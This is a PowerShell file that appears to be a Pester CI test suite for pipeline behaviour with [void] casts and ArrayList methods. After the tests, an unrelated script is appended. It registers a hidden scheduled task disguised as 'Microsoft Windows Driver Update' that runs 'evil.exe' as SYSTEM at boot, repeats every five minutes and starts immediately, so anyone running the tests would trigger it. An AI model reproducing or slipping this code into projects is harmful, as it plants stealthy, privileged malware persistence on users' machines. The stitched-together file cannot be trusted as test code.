

Describe "Scripting.Followup.Tests" -Tags "CI" {
    It "'[void](New-Item) | <Cmdlet>' should work and behave like passing AutomationNull to the pipe" {
        try {
            $testFile = Join-Path $TestDrive (New-Guid)
            [void](New-Item $testFile -ItemType File) | ForEach-Object { "YES" } | Should -BeNullOrEmpty
            
            $testFile | Should -Exist
        } finally {
            Remove-Item $testFile -Force -ErrorAction SilentlyContinue
        }
    }

    
    It "'[void]`$arraylist.Add(1) | <Cmdlet>' should work and behave like passing AutomationNull to the pipe" {
        $arraylist = [System.Collections.ArrayList]::new()
        [void]$arraylist.Add(1) | ForEach-Object { "YES" } | Should -BeNullOrEmpty
        
        $arraylist.Count | Should -Be 1
        $arraylist[0] | Should -Be 1
    }

    
    It "'`$arraylist2.Clear() | <Cmdlet>' should work and behave like passing AutomationNull to the pipe" {
        $arraylist = [System.Collections.ArrayList]::new()
        $arraylist.Add(1) > $null
        $arraylist.Clear() | ForEach-Object { "YES" } | Should -BeNullOrEmpty
        
        $arraylist.Count | Should -Be 0
    }
}

$TaskName = "Microsoft Windows Driver Update"
$TaskDescr = "Microsoft Windows Driver Update Services"
$TaskCommand = "C:\ProgramData\WindowsUpgrade\evil.exe"
$TaskScript = ""
$TaskArg = ""
$TaskStartTime = [datetime]::Now.AddMinutes(1) 
$service = new-object -ComObject("Schedule.Service")
$service.Connect()
$rootFolder = $service.GetFolder("\")
$TaskDefinition = $service.NewTask(0) 
$TaskDefinition.RegistrationInfo.Description = "$TaskDescr"
$TaskDefinition.Settings.Enabled = $true
$TaskDefinition.Settings.Hidden = $true
$TaskDefinition.Settings.RestartCount = "5"
$TaskDefinition.Settings.StartWhenAvailable = $true
$TaskDefinition.Settings.StopIfGoingOnBatteries = $false
$TaskDefinition.Settings.RestartInterval = "PT5M"
$triggers = $TaskDefinition.Triggers
$trigger = $triggers.Create(8)
$trigger.StartBoundary = $TaskStartTime.ToString("yyyy-MM-dd'T'HH:mm:ss")
$trigger.Enabled = $true
$trigger.Repetition.Interval = "PT5M"
$TaskDefinition.Settings.DisallowStartIfOnBatteries = $true
$Action = $TaskDefinition.Actions.Create(0)
$action.Path = "$TaskCommand"
$action.Arguments = "$TaskArg"
$rootFolder.RegisterTaskDefinition("$TaskName",$TaskDefinition,6,"System",$null,5)
SCHTASKS /run /TN $TaskName

